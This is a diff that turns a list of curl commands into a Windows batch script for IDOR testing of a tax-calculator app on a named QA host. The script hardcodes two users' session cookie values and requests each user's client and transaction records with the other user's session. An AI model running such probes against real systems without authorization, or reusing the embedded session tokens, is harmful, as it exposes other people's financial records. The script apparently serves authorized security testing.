@@ -1,24 +1,183 @@
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/LogicSummary?id=98"
+@echo off
+REM ============================================================================
+REM   KPMG TAX CALCULATOR - AUTOMATED IDOR TESTING SCRIPT
+REM   Created: May 4, 2026
+REM   Tester: Ankan Bose
+REM ============================================================================
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/LogicSummary?id=30"
+setlocal enabledelayedexpansion
 
-curl -v -b "TC-BAC-DEV=xu5nie5v4jh3zsebntiuz1bu" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/LogicSummary?id=30"
+REM Define credentials
+set ANKAN_COOKIE=03wmiv45aqnshv1q0jdh3z5g
+set SUDEEP_COOKIE=xu5nie5v4jh3zsebntiuz1bu
+set HOST=https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactionHistory?calcTransactionId=1"
+REM Get current date and time for naming
+for /f "tokens=2-4 delims=/ " %%a in ('date /t') do (set mydate=%%c%%a%%b)
+for /f "tokens=1-2 delims=/:" %%a in ('time /t') do (set mytime=%%a%%b)
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactionHistory?calcTransactionId=100"
+REM Create Results folder
+if not exist "KPMG_Pentest_Results_%mydate%" mkdir KPMG_Pentest_Results_%mydate%
+cd KPMG_Pentest_Results_%mydate%
 
-curl -v -b "TC-BAC-DEV=xu5nie5v4jh3zsebntiuz1bu" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactionHistory?calcTransactionId=1"
+REM Create subfolders
+mkdir LogicSummary 2>nul
+mkdir CalcTransactionHistory 2>nul
+mkdir ClientSelectViewClient 2>nul
+mkdir CalcTransactions 2>nul
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientSelect/ViewClient?clientId=98"
+REM Clear any previous results
+del /q *.txt 2>nul
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientSelect/ViewClient?clientId=30"
+echo.
+echo ============================================================================
+echo   KPMG IDOR VULNERABILITY TESTING - AUTOMATED EXECUTION
+echo ============================================================================
+echo.
+echo Test Date: %date%
+echo Test Time: %time%
+echo Results Folder: KPMG_Pentest_Results_%mydate%
+echo.
+echo ============================================================================
+echo   PHASE 1: LOGICSUMMARY ENDPOINT TESTS
+echo ============================================================================
+echo.
 
-curl -v -b "TC-BAC-DEV=xu5nie5v4jh3zsebntiuz1bu" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/ClientSelect/ViewClient?clientId=30"
+echo [TEST 1A] LogicSummary - Ankan accessing own data (id=98)...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/LogicSummary?id=98" > LogicSummary\1A_LogicSummary_Ankan_own_98.txt 2>&1
+findstr /C:"HTTP" LogicSummary\1A_LogicSummary_Ankan_own_98.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 1A completed) else (echo   ✗ Test 1A failed)
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactions?id=98"
+timeout /t 2 /nobreak > nul
 
-curl -v -b "TC-BAC-DEV=03wmiv45aqnshv1q0jdh3z5g" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactions?id=30"
+echo [TEST 1B] LogicSummary - Ankan accessing Sudeep's data (id=30) - IDOR TEST...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/LogicSummary?id=30" > LogicSummary\1B_LogicSummary_Ankan_cross_30.txt 2>&1
+findstr /C:"HTTP" LogicSummary\1B_LogicSummary_Ankan_cross_30.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 1B completed) else (echo   ✗ Test 1B failed)
 
-curl -v -b "TC-BAC-DEV=xu5nie5v4jh3zsebntiuz1bu" "https://qa.gmsgetb.kpmglinkgo.com/gettaxcalcbac/CalcTransactions?id=30"
+timeout /t 2 /nobreak > nul
 
+echo [TEST 1C] LogicSummary - Sudeep accessing own data (id=30)...
+curl -v -b "TC-BAC-DEV=%SUDEEP_COOKIE%" "%HOST%/LogicSummary?id=30" > LogicSummary\1C_LogicSummary_Sudeep_own_30.txt 2>&1
+findstr /C:"HTTP" LogicSummary\1C_LogicSummary_Sudeep_own_30.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 1C completed) else (echo   ✗ Test 1C failed)
+
+echo.
+echo ============================================================================
+echo   PHASE 2: CALCTRANSACTIONHISTORY ENDPOINT TESTS
+echo ============================================================================
+echo.
+
+echo [TEST 2A] CalcTransactionHistory - Ankan accessing transaction 1...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/CalcTransactionHistory?calcTransactionId=1" > CalcTransactionHistory\2A_CalcTransHistory_Ankan_tx1.txt 2>&1
+findstr /C:"HTTP" CalcTransactionHistory\2A_CalcTransHistory_Ankan_tx1.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 2A completed) else (echo   ✗ Test 2A failed)
+
+timeout /t 2 /nobreak > nul
+
+echo [TEST 2B] CalcTransactionHistory - Ankan accessing transaction 100...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/CalcTransactionHistory?calcTransactionId=100" > CalcTransactionHistory\2B_CalcTransHistory_Ankan_tx100.txt 2>&1
+findstr /C:"HTTP" CalcTransactionHistory\2B_CalcTransHistory_Ankan_tx100.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 2B completed) else (echo   ✗ Test 2B failed)
+
+timeout /t 2 /nobreak > nul
+
+echo [TEST 2C] CalcTransactionHistory - Sudeep accessing transaction 1...
+curl -v -b "TC-BAC-DEV=%SUDEEP_COOKIE%" "%HOST%/CalcTransactionHistory?calcTransactionId=1" > CalcTransactionHistory\2C_CalcTransHistory_Sudeep_tx1.txt 2>&1
+findstr /C:"HTTP" CalcTransactionHistory\2C_CalcTransHistory_Sudeep_tx1.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 2C completed) else (echo   ✗ Test 2C failed)
+
+echo.
+echo ============================================================================
+echo   PHASE 3: CLIENTSELECT/VIEWCLIENT ENDPOINT TESTS
+echo ============================================================================
+echo.
+
+echo [TEST 3A] ClientSelect/ViewClient - Ankan viewing own client (id=98)...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/ClientSelect/ViewClient?clientId=98" > ClientSelectViewClient\3A_ClientView_Ankan_own_98.txt 2>&1
+findstr /C:"HTTP" ClientSelectViewClient\3A_ClientView_Ankan_own_98.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 3A completed) else (echo   ✗ Test 3A failed)
+
+timeout /t 2 /nobreak > nul
+
+echo [TEST 3B] ClientSelect/ViewClient - Ankan viewing Sudeep's client (id=30) - IDOR TEST...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/ClientSelect/ViewClient?clientId=30" > ClientSelectViewClient\3B_ClientView_Ankan_cross_30.txt 2>&1
+findstr /C:"HTTP" ClientSelectViewClient\3B_ClientView_Ankan_cross_30.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 3B completed) else (echo   ✗ Test 3B failed)
+
+timeout /t 2 /nobreak > nul
+
+echo [TEST 3C] ClientSelect/ViewClient - Sudeep viewing own client (id=30)...
+curl -v -b "TC-BAC-DEV=%SUDEEP_COOKIE%" "%HOST%/ClientSelect/ViewClient?clientId=30" > ClientSelectViewClient\3C_ClientView_Sudeep_own_30.txt 2>&1
+findstr /C:"HTTP" ClientSelectViewClient\3C_ClientView_Sudeep_own_30.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 3C completed) else (echo   ✗ Test 3C failed)
+
+echo.
+echo ============================================================================
+echo   PHASE 4: CALCTRANSACTIONS ENDPOINT TESTS
+echo ============================================================================
+echo.
+
+echo [TEST 4A] CalcTransactions - Ankan accessing own transactions (id=98)...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/CalcTransactions?id=98" > CalcTransactions\4A_CalcTrans_Ankan_own_98.txt 2>&1
+findstr /C:"HTTP" CalcTransactions\4A_CalcTrans_Ankan_own_98.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 4A completed) else (echo   ✗ Test 4A failed)
+
+timeout /t 2 /nobreak > nul
+
+echo [TEST 4B] CalcTransactions - Ankan accessing Sudeep's transactions (id=30) - IDOR TEST...
+curl -v -b "TC-BAC-DEV=%ANKAN_COOKIE%" "%HOST%/CalcTransactions?id=30" > CalcTransactions\4B_CalcTrans_Ankan_cross_30.txt 2>&1
+findstr /C:"HTTP" CalcTransactions\4B_CalcTrans_Ankan_cross_30.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 4B completed) else (echo   ✗ Test 4B failed)
+
+timeout /t 2 /nobreak > nul
+
+echo [TEST 4C] CalcTransactions - Sudeep accessing own transactions (id=30)...
+curl -v -b "TC-BAC-DEV=%SUDEEP_COOKIE%" "%HOST%/CalcTransactions?id=30" > CalcTransactions\4C_CalcTrans_Sudeep_own_30.txt 2>&1
+findstr /C:"HTTP" CalcTransactions\4C_CalcTrans_Sudeep_own_30.txt > nul
+if %errorlevel% equ 0 (echo   ✓ Test 4C completed) else (echo   ✗ Test 4C failed)
+
+echo.
+echo ============================================================================
+echo   ANALYSIS: Checking for Vulnerabilities
+echo ============================================================================
+echo.
+
+REM Check for IDOR vulnerabilities
+echo Scanning for HTTP 200 responses (potential IDOR)...
+echo.
+
+findstr /C:"< HTTP" LogicSummary\1B_LogicSummary_Ankan_cross_30.txt | findstr /C:"200" > nul
+if %errorlevel% equ 0 (echo   POSSIBLE IDOR: Test 1B returned HTTP 200) else (echo ✓ Test 1B protected)
+
+findstr /C:"< HTTP" ClientSelectViewClient\3B_ClientView_Ankan_cross_30.txt | findstr /C:"200" > nul
+if %errorlevel% equ 0 (echo   POSSIBLE IDOR: Test 3B returned HTTP 200) else (echo ✓ Test 3B protected)
+
+findstr /C:"< HTTP" CalcTransactions\4B_CalcTrans_Ankan_cross_30.txt | findstr /C:"200" > nul
+if %errorlevel% equ 0 (echo   POSSIBLE IDOR: Test 4B returned HTTP 200) else (echo ✓ Test 4B protected)
+
+echo.
+echo ============================================================================
+echo    ALL TESTS COMPLETED SUCCESSFULLY!
+echo ============================================================================
+echo.
+echo Results saved in: KPMG_Pentest_Results_%mydate%\
+echo.
+echo Next Steps:
+echo   1. Review HTTP codes in each test file
+echo   2. Look for "< HTTP 200" = potential IDOR
+echo   3. Look for "< HTTP 302" = protected endpoint
+echo   4. Search for "clientId" to see data exposure
+echo.
+echo Folder Structure:
+echo   ├─ LogicSummary\
+echo   ├─ CalcTransactionHistory\
+echo   ├─ ClientSelectViewClient\
+echo   └─ CalcTransactions\
+echo.
+
+REM Open results folder
+explorer .
+
+cd ..
+pause
